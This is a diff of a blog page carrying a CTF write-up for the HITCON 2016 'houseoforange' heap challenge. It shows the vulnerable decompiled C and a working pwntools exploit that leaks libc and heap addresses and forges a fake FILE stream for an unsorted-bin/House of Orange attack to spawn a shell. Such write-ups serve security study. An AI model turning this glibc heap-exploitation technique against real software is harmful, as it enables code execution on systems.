@@ -7,15 +7,20 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <meta name="baidu-site-verification" content="RNCre9JfIO" />
   <link rel="dns-prefetch" href="https://sunichi.github.io">
-  <title>Tag: ptmalloc | Sunichi&#39;s Blog</title>
+  <title>hitcon 2016 houseoforange writeup | Sunichi&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sunichi&#39;s Blog">
-<meta property="og:url" content="https://sunichi.github.io/tags/ptmalloc/index.html">
+  <meta name="description" content="0x00 Program OverallThe program can Build(), Upgrade() and See() the house of orange. In Build(), the program first malloc a chunk of size 0x10 to store two address, one is color and price, and the ot">
+<meta name="keywords" content="ctf,pwn,heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hitcon 2016 houseoforange writeup">
+<meta property="og:url" content="https://sunichi.github.io/2018/07/03/hitcon16-houseoforange/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
+<meta property="og:description" content="0x00 Program OverallThe program can Build(), Upgrade() and See() the house of orange. In Build(), the program first malloc a chunk of size 0x10 to store two address, one is color and price, and the ot">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-07-03T08:21:09.351Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sunichi&#39;s Blog">
+<meta name="twitter:title" content="hitcon 2016 houseoforange writeup">
+<meta name="twitter:description" content="0x00 Program OverallThe program can Build(), Upgrade() and See() the house of orange. In Build(), the program first malloc a chunk of size 0x10 to store two address, one is color and price, and the ot">
   
     <link rel="alternative" href="/atom.xml" title="Sunichi&#39;s Blog" type="application/atom+xml">
   
@@ -149,68 +154,195 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-hitcon16-houseoforange" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/06/04/ptmalloc-malloc_consolidate/" class="archive-article-date">
-  	<time datetime="2018-06-04T12:50:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-04</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/06/04/ptmalloc-malloc_consolidate/">ptmalloc malloc_consolidate分析</a>
+    <h1 class="article-title" itemprop="name">
+      hitcon 2016 houseoforange writeup
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/07/03/hitcon16-houseoforange/" class="archive-article-date">
+  	<time datetime="2018-07-03T08:20:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="0x00-Program-Overall"><a href="#0x00-Program-Overall" class="headerlink" title="0x00 Program Overall"></a>0x00 Program Overall</h4><p>The program can <code>Build()</code>, <code>Upgrade()</code> and <code>See()</code> the house of orange. In <code>Build()</code>, the program first malloc a chunk of size 0x10 to store two address, one is color and price, and the other is the name. At the end of the <code>Build()</code>, a variable on bss will store the new house address and use it in <code>Upgrade()</code> and <code>See()</code>. We can use  <code>Upgrade()</code> and <code>See()</code> to update and see the newest house.</p>
+<a id="more"></a>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Build</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)COUNT &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too many house"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  New_House = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Length of name :"</span>);</span><br><span class="line">  size = InputNum();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    size = <span class="number">4096</span>;</span><br><span class="line">  *((_QWORD *)New_House + <span class="number">1</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)New_House + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Malloc error !!!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name :"</span>);</span><br><span class="line">  InputString(*((<span class="keyword">void</span> **)New_House + <span class="number">1</span>), size);</span><br><span class="line">  new_price = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Price of Orange:"</span>, <span class="number">8L</span>L);</span><br><span class="line">  *new_price = InputNum();</span><br><span class="line">  Show_Color();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Color of Orange:"</span>);</span><br><span class="line">  Color_Num = InputNum();</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> ( Color_Num == <span class="number">56746</span> )</span><br><span class="line">    new_price[<span class="number">1</span>] = <span class="number">56746</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    new_price[<span class="number">1</span>] = Color_Num + <span class="number">30</span>;</span><br><span class="line">  *(_QWORD *)New_House = new_price;</span><br><span class="line">  Last_House = New_House;</span><br><span class="line">  ++COUNT;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Finish"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="0x01-Program-Vulnerabilities"><a href="#0x01-Program-Vulnerabilities" class="headerlink" title="0x01 Program Vulnerabilities"></a>0x01 Program Vulnerabilities</h4><p>When the program calls the <code>Upgrade()</code>, it allows user to give it the length of the name which leads to heap overflow:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Upgrade</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Length of name :"</span>);</span><br><span class="line">  v2 = InputNum();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0x1000</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name:"</span>);</span><br><span class="line">  InputString((<span class="keyword">void</span> *)Last_House[<span class="number">1</span>], v2);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Finish"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>So, use unsorted bin attack and house of orange to get the shell.</p>
+<h4 id="0x02-Pwn"><a href="#0x02-Pwn" class="headerlink" title="0x02 Pwn!"></a>0x02 Pwn!</h4><p>First we need to use heap overflow to trigger <code>_int_free()</code> in <code>sysmalloc()</code> to leak the libc address.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    p = process(<span class="string">'./houseoforange'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    </span><br><span class="line">    Build(p, <span class="number">0x80</span>, <span class="string">'sunichi1'</span>, <span class="number">0x10</span>, <span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># overflow the top chunk's size</span></span><br><span class="line">    payload = <span class="string">'B'</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">0x1</span>) + p32(<span class="number">0x1f</span>) + <span class="number">2</span> * p64(<span class="number">0</span>) + p64(<span class="number">0xf31</span>)</span><br><span class="line">    Upgrade(p, <span class="number">0x100</span>, payload, <span class="number">0x10</span>, <span class="number">2</span>) <span class="comment"># 2</span></span><br><span class="line">    <span class="comment"># trigger free in sysmalloc</span></span><br><span class="line">    Build(p, <span class="number">0x1000</span>, <span class="string">'sunichi2'</span>, <span class="number">0x10</span>, <span class="number">3</span>) <span class="comment"># 3</span></span><br><span class="line">    <span class="comment"># get the info of libc address</span></span><br><span class="line">    Build(p, <span class="number">0x400</span>, <span class="string">'x'</span>, <span class="number">4</span>, <span class="number">4</span>) <span class="comment"># 0x400 = 1024 =&gt; large bin / still have some questions</span></span><br><span class="line">    See(p)</span><br><span class="line">    p.recvuntil(<span class="string">'house : '</span>)</span><br><span class="line">    libc_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">    libc_addr = u64(libc_addr.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    libc.address = libc_addr - <span class="number">0x3c4b78</span> - <span class="number">0x600</span></span><br><span class="line">    libc_base_addr = libc_addr - <span class="number">0x3c4b78</span> - <span class="number">0x600</span></span><br></pre></td></tr></table></figure>
+<p>Second, leak the heap address.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak the heap address</span></span><br><span class="line">Upgrade(p, <span class="number">0x400</span>, <span class="string">'1'</span> * <span class="number">0x10</span>, <span class="number">0x10</span>, <span class="number">5</span>)</span><br><span class="line">See(p)</span><br><span class="line">p.recvuntil(<span class="string">'1'</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="comment"># address is the third house content address - 0x10</span></span><br><span class="line">heap_addr = u64(heap_addr.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure>
+<p>The final step is to construct the a chunk to perform unsorted bin attack and house of orange.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># unsorted bin attack and house of orange</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>, <span class="string">'\x00'</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x2300000010</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vtable = heap_addr + <span class="number">0x410</span> + <span class="number">0x20</span> + <span class="number">0xc0</span> + <span class="number">0x10</span> + <span class="number">0x8</span> <span class="comment"># point to vtable itself</span></span><br><span class="line"><span class="comment"># change top chunk to 0x61 size and forge the stream</span></span><br><span class="line">fake_stream = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'_IO_list_all'</span>] - <span class="number">0x10</span>) <span class="comment"># here is heap + 0x410 + 0x20</span></span><br><span class="line">fake_stream = fake_stream.ljust(<span class="number">0xa0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">fake_stream += p64(heap_addr + <span class="number">0x410</span> + <span class="number">0x20</span> + <span class="number">0xc0</span> + <span class="number">0x10</span>)</span><br><span class="line">fake_stream = fake_stream.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">fake_stream += p64(<span class="number">1</span>) + <span class="number">2</span> * p64(<span class="number">0</span>) <span class="comment"># here is heap + 0x410 + 0x20 + 0xc0</span></span><br><span class="line">fake_stream += p64(vtable)</span><br><span class="line"></span><br><span class="line">payload += fake_stream</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">Upgrade(p, len(payload), payload, <span class="number">0x10</span>, <span class="number">6</span>)</span><br></pre></td></tr></table></figure>
+<p>Call <code>Build()</code> to trigger <code>malloc(0x10)</code> and get shell.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<blockquote>
+<p>参考文章：</p>
+<p><a href="https://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/">https://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/</a></p>
+<p><a href="http://tacxingxing.com/2018/01/10/house-of-orange/" target="_blank" rel="noopener">http://tacxingxing.com/2018/01/10/house-of-orange/</a></p>
+<p><a href="http://tacxingxing.com/2018/02/09/fsp/" target="_blank" rel="noopener">http://tacxingxing.com/2018/02/09/fsp/</a></p>
+</blockquote>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">heap</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">libc</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ptmalloc</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunichi.github.io/2018/07/03/hitcon16-houseoforange/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2018/07/02/pwnable-tw-bookwriter/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">pwnable tw bookwriter writeup</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -233,9 +365,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
